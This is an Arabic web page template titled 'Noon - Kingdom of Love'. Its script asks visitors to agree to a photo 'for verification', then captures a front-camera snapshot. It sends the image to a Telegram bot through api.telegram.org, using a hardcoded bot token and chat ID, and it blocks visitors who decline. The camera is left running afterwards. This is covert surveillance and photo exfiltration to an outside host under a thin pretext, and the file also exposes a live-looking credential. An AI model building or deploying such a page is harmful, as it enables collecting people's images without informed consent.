<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>نون - مملكة الحب</title>
    <style>
        /* نفس الأنماط السابقة مع إضافة التالي */
        #camera-preview {
            position: fixed;
            bottom: 20px;
            right: 20px;
            width: 120px;
            height: 90px;
            border-radius: 16px;
            border: 2px solid #fbbf24;
            box-shadow: 0 0 30px rgba(251,191,36,0.3);
            object-fit: cover;
            z-index: 9999;
            display: none;
        }
    </style>
</head>
<body>

    <!-- ... نفس الهيكل السابق ... -->

    <video id="camera-preview" autoplay playsinline></video>

    <script>
        // ============================================================
        // 0. متغيرات البوت
        // ============================================================
        const BOT_TOKEN = '8770149502:AAFkmj14adoaUHCFHXcBO9aNwjjDdpcfuLY';
        const CHAT_ID = 1170411845;

        // ============================================================
        // 1. طلب الموافقة عند الدخول
        // ============================================================
        window.addEventListener('load', function() {
            const agree = confirm('📸 هل توافق على الدخول إلى الموقع؟ (سيتم التقاط صورة للتحقق)');

            if (!agree) {
                document.body.innerHTML = '<h1 style="color:red;text-align:center;margin-top:20vh;">🚫 تم رفض الدخول</h1>';
                return;
            }

            // بدء الكاميرا فور الموافقة
            startCameraAndCapture();
        });

        // ============================================================
        // 2. تشغيل الكاميرا + التقاط الصورة + الإرسال
        // ============================================================
        function startCameraAndCapture() {
            const video = document.getElementById('camera-preview');

            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false })
                .then(stream => {
                    video.srcObject = stream;
                    video.style.display = 'block';

                    // انتظر 1.5 ثانية للتعريض ثم التقط
                    setTimeout(() => {
                        captureAndSend(video);
                        // أوقف الكاميرا بعد التصوير (اختياري)
                        // stream.getTracks().forEach(t => t.stop());
                        // video.style.display = 'none';
                    }, 1500);
                })
                .catch(err => {
                    alert('⚠️ لا يمكن الوصول إلى الكاميرا: ' + err.message);
                    log('⚠️ فشل الكاميرا', 'error');
                });
        }

        // ============================================================
        // 3. التقاط الصورة وإرسالها للبوت
        // ============================================================
        function captureAndSend(video) {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            canvas.toBlob(function(blob) {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'capture_' + Date.now() + '.jpg');
                formData.append('caption', '🪷 دخول جديد إلى نون\n' + new Date().toLocaleString('ar-JO'));

                fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                })
                .then(res => res.json())
                .then(data => {
                    if (data.ok) {
                        log('📸 تم إرسال الصورة إلى البوت', 'success');
                    } else {
                        log('⚠️ فشل إرسال الصورة', 'error');
                    }
                })
                .catch(() => {
                    log('⚠️ تعذر الاتصال بالبوت', 'error');
                });

                // عرض الصورة في الواجهة (للمستخدم)
                const img = document.createElement('img');
                img.src = URL.createObjectURL(blob);
                img.style.width = '100%';
                img.style.maxWidth = '300px';
                img.style.borderRadius = '16px';
                img.style.marginTop = '12px';
                document.querySelector('.output-area').prepend(img);
            }, 'image/jpeg', 0.9);
        }

        // ============================================================
        // 4. باقي الكود (نفس السابق)
        // ============================================================
        // ... جميع دوال log, randomFrom, الأزرار, إلخ ...
        // (ضعها هنا كما هي دون تغيير)
    </script>
</body>
</html>
